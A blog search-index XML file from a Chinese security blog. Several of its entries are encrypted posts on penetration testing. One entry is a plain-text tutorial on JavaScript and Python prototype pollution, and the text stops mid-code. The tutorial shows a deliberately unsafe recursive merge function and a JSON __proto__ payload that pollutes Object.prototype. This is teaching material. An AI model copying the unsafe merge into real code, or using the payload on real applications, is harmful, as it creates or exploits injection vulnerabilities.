<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>impacket工具集</title>
    <link href="/tuyi/2025/03/14/impacket%E5%B7%A5%E5%85%B7%E9%9B%86/"/>
    <url>/tuyi/2025/03/14/impacket%E5%B7%A5%E5%85%B7%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误，请重试。" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="5745315566f6c847a85013d67100724eedfb486cd8bd7e3befae421b01be1786"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">此文章已加密或未写完，请输入密码以查看全文内容。</span>      </label>    </div>  </div></div><script data-pjax src="/tuyi/lib/hbe.js"></script><link href="/tuyi/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>impacket工具集</category>
      
    </categories>
    
    
    <tags>
      
      <tag>impacket工具集</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内网代理搭建</title>
    <link href="/tuyi/2025/03/14/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E6%90%AD%E5%BB%BA/"/>
    <url>/tuyi/2025/03/14/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误，请重试。" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="3888a7409671bad2dfdf34bc59b2f3abac7201ac158e66731ad38d2d1079266a">7389a4e37e9dabc8af72228f567f583bb5a45bd0f3a6f097aaa03e2b7f93f5d09d4589966276ffd56cd42de402104883ba17a53f0d9474e51b845bfda3cf64e2a1b9bbc197c5670f05737b30be4550c364925fd3dffa9be7641f86fa248813607c6011a828298177d44d3366c1343b1b9065f382e0ff812a095aa15bc601105791d6c98e76cf7049861e1dfbc65600e754b9e4fd30d17ced801159296e7b5a1c174cc807b879d45fc44cb5a460ef02ca0e0315510a1b0019cbc2629924420cf3def69a11fd26a828e8b5e07ea7d8b4e2645734b0e37c9e21f06b117fc19327ee05a8eace4532b9d3067bfcfdad8f33459e1c5d4292a4beb4fd829519473b3de137a72cdb0215fc419d7f4d9c0dbd18e7d1262d06daeb928a7b8c0962430a65cd034de2536ad7865c383f6c09af3e1aca5b2bee2f108c66a028fff357ddf081d44240298b774ae2c5ab306715a0cfe3fb30e6751b05f25f25b3c7ee4c2f8806f32411e6cddc23301e299d57aae205096fe89129e6d6e2df3b054ff810bb9e2d7c</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">此文章已加密或未写完，请输入密码以查看全文内容。</span>      </label>    </div>  </div></div><script data-pjax src="/tuyi/lib/hbe.js"></script><link href="/tuyi/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>内网代理搭建</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网代理搭建</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内网小工具</title>
    <link href="/tuyi/2025/03/13/%E5%86%85%E7%BD%91%E5%B0%8F%E5%B7%A5%E5%85%B7/"/>
    <url>/tuyi/2025/03/13/%E5%86%85%E7%BD%91%E5%B0%8F%E5%B7%A5%E5%85%B7/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误，请重试。" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="56286c8aa3a53c548cb00101bf09de3bc2d664fe51a3362e81e924968354564e"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">此文章已加密或未写完，请输入密码以查看全文内容。</span>      </label>    </div>  </div></div><script data-pjax src="/tuyi/lib/hbe.js"></script><link href="/tuyi/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>内网小工具</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网小工具</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>春秋云境·网鼎杯半决赛</title>
    <link href="/tuyi/2025/03/13/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%C2%B7%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/"/>
    <url>/tuyi/2025/03/13/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%C2%B7%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误，请重试。" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="033a12965c55e469bb26e31d26054c6d9e2b7f7b3f889f2376d53674a5e32adf"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">此文章已加密或未写完，请输入密码以查看全文内容。</span>      </label>    </div>  </div></div><script data-pjax src="/tuyi/lib/hbe.js"></script><link href="/tuyi/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>知识点</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网渗透</tag>
      
      <tag>春秋云镜</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>原型链污染</title>
    <link href="/tuyi/2025/03/09/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
    <url>/tuyi/2025/03/09/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
    
    <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>最近复现知识点时发现，原型链污染这一块的原来还不是很清楚，平时都是那工具搜哈的，现在有时间捡起来重新学习一下</p><h1 id="JavaScript原型链污染"><a href="#JavaScript原型链污染" class="headerlink" title="JavaScript原型链污染"></a>JavaScript原型链污染</h1><h2 id="prototype和-proto-分别是什么"><a href="#prototype和-proto-分别是什么" class="headerlink" title="prototype和__proto__分别是什么"></a><code>prototype</code>和<code>__proto__</code>分别是什么</h2><p>JavaScript中，我们如果要定义一个类，需要以定义“构造函数”的方式来定义：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Foo</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">bar</span> = <span class="hljs-number">1</span><br>&#125;<br><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">Foo</span>()<br></code></pre></td></tr></table></figure><p><code>Foo</code>函数的内容，就是<code>Foo</code>类的构造函数，而<code>this.bar</code>就是<code>Foo</code>类的一个属性。</p><p>一个类必然有一些方法，类似属性<code>this.bar</code>，我们也可以将方法定义在构造函数内部：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Foo</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">bar</span> = <span class="hljs-number">1</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">show</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">bar</span>)<br>    &#125;<br>&#125;<br><br>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Foo</span>()).<span class="hljs-title function_">show</span>()<br></code></pre></td></tr></table></figure><p>但这样写有一个问题，就是每当我们新建一个Foo对象时，<code>this.show = function...</code>就会执行一次，这个<code>show</code>方法实际上是绑定在对象上的，而不是绑定在“类”中。</p><p>我希望在创建类的时候只创建一次<code>show</code>方法，这时候就则需要使用原型（prototype）了：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Foo</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">bar</span> = <span class="hljs-number">1</span><br>&#125;<br><br><span class="hljs-title class_">Foo</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">show</span> = <span class="hljs-keyword">function</span> <span class="hljs-title function_">show</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">bar</span>)<br>&#125;<br><br><span class="hljs-keyword">let</span> foo = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Foo</span>()<br>foo.<span class="hljs-title function_">show</span>()<br></code></pre></td></tr></table></figure><p>我们可以认为原型<code>prototype</code>是类<code>Foo</code>的一个属性，而所有用<code>Foo</code>类实例化的对象，都将拥有这个属性中的所有内容，包括变量和方法。比如上图中的<code>foo</code>对象，其天生就具有<code>foo.show()</code>方法。</p><p>我们可以通过<code>Foo.prototype</code>来访问<code>Foo</code>类的原型，但<code>Foo</code>实例化出来的对象，是不能通过prototype访问原型的。这时候，就该<code>__proto__</code>登场了。</p><p>一个Foo类实例化出来的foo对象，可以通过<code>foo.__proto__</code>属性来访问Foo类的原型，也就是说：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">foo.<span class="hljs-property">__proto__</span> == <span class="hljs-title class_">Foo</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span><br></code></pre></td></tr></table></figure><p>所以，总结一下：</p><ol><li><code>prototype</code>是一个类的属性，所有类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法</li><li>一个对象的<code>__proto__</code>属性，指向这个对象所在的类的<code>prototype</code>属性</li></ol><h2 id="JavaScript原型链继承"><a href="#JavaScript原型链继承" class="headerlink" title="JavaScript原型链继承"></a>JavaScript原型链继承</h2><p>所有类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法，这个特性被用来实现JavaScript中的继承机制。</p><p>比如：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Father</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">first_name</span> = <span class="hljs-string">&#x27;Donald&#x27;</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">last_name</span> = <span class="hljs-string">&#x27;Trump&#x27;</span><br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Son</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">first_name</span> = <span class="hljs-string">&#x27;Melania&#x27;</span><br>&#125;<br><br><span class="hljs-title class_">Son</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Father</span>()<br><br><span class="hljs-keyword">let</span> son = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Son</span>()<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Name: <span class="hljs-subst">$&#123;son.first_name&#125;</span> <span class="hljs-subst">$&#123;son.last_name&#125;</span>`</span>)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(son.<span class="hljs-property">__proto__</span>)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(son.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span>)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(son.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span>)<br></code></pre></td></tr></table></figure><p>Son类继承了Father类的<code>last_name</code>属性，最后输出的是<code>Name: Melania Trump</code>。</p><p>总结一下，对于对象son，在调用<code>son.last_name</code>的时候，实际上JavaScript引擎会进行如下操作：</p><ol><li>在对象son中寻找last_name</li><li>如果找不到，则在<code>son.__proto__</code>中寻找last_name</li><li>如果仍然找不到，则继续在<code>son.__proto__.__proto__</code>中寻找last_name</li><li>依次寻找，直到找到<code>null</code>结束。比如，<code>Object.prototype</code>的<code>__proto__</code>就是<code>null</code><br><img src="C:/Users/xp/AppData/Roaming/Typora/typora-user-images/image-20250311224928865.png" alt="image-20250311224928865"></li></ol><p>JavaScript的这个查找的机制，被运用在面向对象的继承中，被称作prototype继承链。</p><p>以上就是最基础的JavaScript面向对象编程，只要牢记以下几点即可：</p><ol><li>每个构造函数(constructor)都有一个原型对象(prototype)</li><li>对象的<code>__proto__</code>属性，指向类的原型对象<code>prototype</code></li><li>JavaScript使用prototype链实现继承机制</li></ol><h2 id="什么是原型链污染"><a href="#什么是原型链污染" class="headerlink" title="什么是原型链污染"></a>什么是原型链污染</h2><p><code>foo.__proto__</code>指向的是<code>Foo</code>类的<code>prototype</code>。那么，如果我们修改了<code>foo.__proto__</code>中的值，是不是就可以修改Foo类呢？</p><p>做个简单的实验：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// foo是一个简单的JavaScript对象</span><br><span class="hljs-keyword">let</span> foo = &#123;<span class="hljs-attr">bar</span>: <span class="hljs-number">1</span>&#125;<br><br><span class="hljs-comment">// foo.bar 此时为1</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(foo.<span class="hljs-property">bar</span>)<br><br><span class="hljs-comment">// 修改foo的原型（即Object）</span><br>foo.<span class="hljs-property">__proto__</span>.<span class="hljs-property">bar</span> = <span class="hljs-number">2</span><br><br><span class="hljs-comment">// 由于查找顺序的原因，foo.bar仍然是1</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(foo.<span class="hljs-property">bar</span>)<br><br><span class="hljs-comment">// 此时再用Object创建一个空的zoo对象</span><br><span class="hljs-keyword">let</span> zoo = &#123;&#125;<br><br><span class="hljs-comment">// 查看zoo.bar</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(zoo.<span class="hljs-property">bar</span>)<br></code></pre></td></tr></table></figure><p>最后，虽然zoo是一个<strong>空</strong>对象<code>&#123;&#125;</code>，但<code>zoo.bar</code>的结果居然是2：</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250311225454881.png" alt="image-20250311225454881"></p><p>原因也显而易见：因为前面我们修改了foo的原型<code>foo.__proto__.bar = 2</code>，而foo是一个Object类的实例，所以实际上是修改了Object这个类，给这个类增加了一个属性bar，值为2。</p><p>后来，我们又用Object类创建了一个zoo对象<code>let zoo = &#123;&#125;</code>，zoo对象自然也有一个bar属性了。</p><p>那么，在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是<strong>原型链污染</strong>。</p><h2 id="哪些情况下原型链会被污染"><a href="#哪些情况下原型链会被污染" class="headerlink" title="哪些情况下原型链会被污染"></a>哪些情况下原型链会被污染</h2><p>在实际应用中，哪些情况下可能存在原型链能被攻击者修改的情况呢？</p><p>我们思考一下，哪些情况下我们可以设置<code>__proto__</code>的值呢？其实找找能够控制数组（对象）的“键名”的操作即可：</p><ul><li>对象merge</li><li>对象clone（其实内核就是将待操作的对象merge到一个空对象中）</li></ul><p>以对象merge为例，我们想象一个简单的merge函数：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">target, source</span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> source) &#123;<br>        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> source &amp;&amp; key <span class="hljs-keyword">in</span> target) &#123;<br>            <span class="hljs-title function_">merge</span>(target[key], source[key])<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            target[key] = source[key]<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在合并的过程中，存在赋值的操作<code>target[key] = source[key]</code>，那么，这个key如果是<code>__proto__</code>，是不是就可以原型链污染呢？</p><p>我们用如下代码实验一下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> o1 = &#123;&#125;<br><span class="hljs-keyword">let</span> o2 = &#123;<span class="hljs-attr">a</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<span class="hljs-attr">b</span>: <span class="hljs-number">2</span>&#125;&#125;<br><span class="hljs-title function_">merge</span>(o1, o2)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o1.<span class="hljs-property">a</span>, o1.<span class="hljs-property">b</span>)<br><br>o3 = &#123;&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o3.<span class="hljs-property">b</span>)<br></code></pre></td></tr></table></figure><p>结果是，合并虽然成功了，但原型链没有被污染：</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250311225904998.png" alt="image-20250311225904998"></p><p>这是因为，我们用JavaScript创建o2的过程（<code>let o2 = &#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;</code>）中，<code>__proto__</code>已经代表o2的原型了，此时遍历o2的所有键名，你拿到的是<code>[a, b]</code>，<code>__proto__</code>并不是一个key，自然也不会修改Object的原型。</p><p>那么，如何让<code>__proto__</code>被认为是一个键名呢？</p><p>我们将代码改成如下：</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs erlang"><span class="hljs-keyword">let</span> o1 = &#123;&#125;<br><span class="hljs-keyword">let</span> o2 = JSON.parse(&#x27;&#123;<span class="hljs-string">&quot;a&quot;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<span class="hljs-string">&quot;b&quot;</span>: <span class="hljs-number">2</span>&#125;&#125;&#x27;)<br><span class="hljs-function"><span class="hljs-title">merge</span><span class="hljs-params">(o1, o2)</span></span><br><span class="hljs-function"><span class="hljs-title">console</span>.<span class="hljs-title">log</span><span class="hljs-params">(o1.a, o1.b)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">o3</span> = &#123;&#125;</span><br><span class="hljs-function"><span class="hljs-title">console</span>.<span class="hljs-title">log</span><span class="hljs-params">(o3.b)</span></span><br></code></pre></td></tr></table></figure><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250311225953552.png" alt="image-20250311225953552"></p><p>可见，新建的o3对象，也存在b属性，说明Object已经被污染：</p><p>这是因为，JSON解析的情况下，<code>__proto__</code>会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历o2的时候会存在这个键。</p><p>merge操作是最常见可能控制键名的操作，也最能被原型链攻击，很多常见的库都存在这个问题</p><p>当然<code>clone</code>同样存在该问题，后续研究</p><h1 id="python原型链污染"><a href="#python原型链污染" class="headerlink" title="python原型链污染"></a>python原型链污染</h1><p>在python中，万物即对象，每个对象都有一个指向类的引用，类还有自己的属性和方法，在实例查找属性或方法时的调用顺序时</p><p><code>实例字典 → 类字典 → 父类字典 … → object(基类)</code>MRO的解析顺序,但是与js不同的是，python没有<code>proto</code>这样的原型链，继承关系完全</p><p>由类层次结构决定</p><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>引用一位师傅的方法</p><ul><li><p>在Python中，定义类是通过<code>class</code>关键字，<code>class</code>后面紧接着是类名，紧接着是<code>(object)</code>，表示该类是从哪个类继承下来的，所有类的本源都是object类</p></li><li><p>可以自由地给一个实例变量绑定属性，像js</p></li><li><p>由于类可以起到模板的作用，因此，可以在创建实例的时候，把一些我们认为必须绑定的属性强制填写进去。通过定义一个特殊的<code>__init__</code>方法，在创建实例的时候，就把类内置的属性绑上</p></li><li><p>注意到<code>__init__</code>方法的第一个参数永远是<code>self</code>，表示创建的实例本身，因此，在<code>__init__</code>方法内部，就可以把各种属性绑定到<code>self</code>，因为<code>self</code>就指向创建的实例本身。</p></li><li><p>当我们定义了一个类属性后，这个属性虽然归类所有，但类的所有实例都可以访问到</p></li><li><p>判断一个变量是否是某个类型可以用<code>isinstance()</code>判断。</p></li></ul><h2 id="python的继承"><a href="#python的继承" class="headerlink" title="python的继承"></a>python的继承</h2><h3 id="单继承"><a href="#单继承" class="headerlink" title="单继承"></a>单继承</h3><p>通super()调用父类方法，没必要重复写了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name</span>):<br>        <span class="hljs-variable language_">self</span>.name = name<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">speak</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">raise</span> NotImplementedError(<span class="hljs-string">&quot;Subclass must implement this abstract method&quot;</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span>(<span class="hljs-title class_ inherited__">Animal</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, breed</span>):<br>        <span class="hljs-built_in">super</span>().__init__(name)  <span class="hljs-comment"># 调用父类的构造函数</span><br>        <span class="hljs-variable language_">self</span>.breed = breed<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">speak</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;self.name&#125;</span> says Woof!&quot;</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-title class_ inherited__">Animal</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, color</span>):<br>        <span class="hljs-built_in">super</span>().__init__(name)  <span class="hljs-comment"># 调用父类的构造函数</span><br>        <span class="hljs-variable language_">self</span>.color = color<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">speak</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">super</span>().speak()  <span class="hljs-comment"># 调用父类的 speak 方法</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;self.name&#125;</span> says Meow!&quot;</span>)<br><br><br>instance = Cat(<span class="hljs-string">&quot;猫&quot;</span>, <span class="hljs-string">&quot;black&quot;</span>)<br><span class="hljs-built_in">print</span>(instance.name)<br><span class="hljs-built_in">print</span>(instance.__class__.__mro__)<br><br></code></pre></td></tr></table></figure><p>结果</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">猫<br>(&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;__main__.Cat&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;__main__.Animal&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;object&#x27;</span>&gt;)<br></code></pre></td></tr></table></figure><p>单继承的调用链</p><h3 id="多继承"><a href="#多继承" class="headerlink" title="多继承"></a>多继承</h3><p>加上</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Flyer</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">fly</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;self.name&#125;</span> is flying.&quot;</span>)<br>        <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Bird</span>(Animal, Flyer):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, species</span>):<br>        <span class="hljs-built_in">super</span>().__init__(name)  <span class="hljs-comment"># 调用父类的构造函数</span><br>        <span class="hljs-variable language_">self</span>.species = species<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">speak</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;self.name&#125;</span> chirps.&quot;</span>)<br><br>a=Bird(<span class="hljs-string">&quot;Bob&quot;</span>,<span class="hljs-string">&quot;Male&quot;</span>)<br><span class="hljs-built_in">print</span>(a.__class__.__mro__)<br></code></pre></td></tr></table></figure><p>可以看见</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">(<span class="hljs-name">&lt;class</span> &#x27;__main__.Bird&#x27;&gt;, &lt;class &#x27;__main__.Animal&#x27;&gt;, &lt;class &#x27;__main__.Flyer&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;)<br></code></pre></td></tr></table></figure><p>标准的MRO调用顺序</p><h3 id="污染过程解析"><a href="#污染过程解析" class="headerlink" title="污染过程解析"></a>污染过程解析</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 